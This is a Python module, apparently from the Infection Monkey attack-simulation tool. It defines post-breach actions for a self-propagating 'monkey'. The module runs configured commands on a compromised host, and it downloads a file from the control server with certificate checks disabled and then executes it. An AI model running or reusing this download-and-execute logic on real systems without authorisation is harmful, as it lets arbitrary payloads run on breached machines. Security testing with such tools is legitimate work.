import logging
import infection_monkey.config
import platform
from infection_monkey.control import ControlClient
import infection_monkey.monkeyfs as monkeyfs
from infection_monkey.config import WormConfiguration
import requests
import shutil
import os
from file_execution import FileExecution
from pba import PBA

LOG = logging.getLogger(__name__)

__author__ = 'VakarisZ'

DOWNLOAD_CHUNK = 1024


# Class that handles post breach action execution
class PostBreach(object):
    def __init__(self):
        self.os_is_linux = False if platform.system() == 'Windows' else True
        self.pba_list = self.config_to_pba_list(infection_monkey.config.WormConfiguration)

    def execute(self):
        for pba in self.pba_list:
            pba.run(self.os_is_linux)

    def config_to_pba_list(self, config):
        """
        Should return a list of PBA's generated from config. After full implementation this will pick
        which PBA's to run.
        """
        pba_list = []
        # Get custom PBA commands from config
        custom_pba_linux = config.custom_post_breach['linux']
        custom_pba_windows = config.custom_post_breach['windows']

        if custom_pba_linux or custom_pba_windows:
            pba_list.append(PBA('custom_pba', custom_pba_linux, custom_pba_windows))

        # Download user's pba file by providing dest. dir, filename and file size
        if config.custom_post_breach['linux_file'] and self.os_is_linux:
            uploaded = PostBreach.download_PBA_file(PostBreach.get_dest_dir(config, self.os_is_linux),
                                         config.custom_post_breach['linux_file'][0],
                                         config.custom_post_breach['linux_file'][1])
            if not custom_pba_linux and uploaded:
                pba_list.append(FileExecution("./"+config.custom_post_breach['linux_file'][0]))
        elif config.custom_post_breach['windows_file'] and not self.os_is_linux:
            uploaded = PostBreach.download_PBA_file(PostBreach.get_dest_dir(config, self.os_is_linux),
                                         config.custom_post_breach['windows_file'][0],
                                         config.custom_post_breach['windows_file'][1])
            if not custom_pba_windows and uploaded:
                pba_list.append(FileExecution(config.custom_post_breach['windows_file'][0]))

        return pba_list

    @staticmethod
    def download_PBA_file(dst_dir, filename, size):
        PBA_file_v_path = PostBreach.download_PBA_file_to_vfs(filename, size)
        try:
            with monkeyfs.open(PBA_file_v_path, "rb") as downloaded_PBA_file:
                with open(os.path.join(dst_dir, filename), 'wb') as written_PBA_file:
                    shutil.copyfileobj(downloaded_PBA_file, written_PBA_file)
            return True
        except IOError as e:
            LOG.error("Can not download post breach file to target machine, because %s" % e)
            return False

    @staticmethod
    def download_PBA_file_to_vfs(filename, size):
        if not WormConfiguration.current_server:
            return None
        try:
            dest_file = monkeyfs.virtual_path(filename)
            if (monkeyfs.isfile(dest_file)) and (size == monkeyfs.getsize(dest_file)):
                return dest_file
            else:
                download = requests.get("https://%s/api/pba/download/%s" %
                                        (WormConfiguration.current_server, filename),
                                        verify=False,
                                        proxies=ControlClient.proxies)

                with monkeyfs.open(dest_file, 'wb') as file_obj:
                    for chunk in download.iter_content(chunk_size=DOWNLOAD_CHUNK):
                        if chunk:
                            file_obj.write(chunk)
                    file_obj.flush()
                if size == monkeyfs.getsize(dest_file):
                    return dest_file

        except Exception as exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)

    @staticmethod
    def get_dest_dir(config, is_linux):
        if is_linux:
            return os.path.dirname(config.dropper_target_path_linux)
        else:
            return os.path.dirname(config.dropper_target_path_win_32)
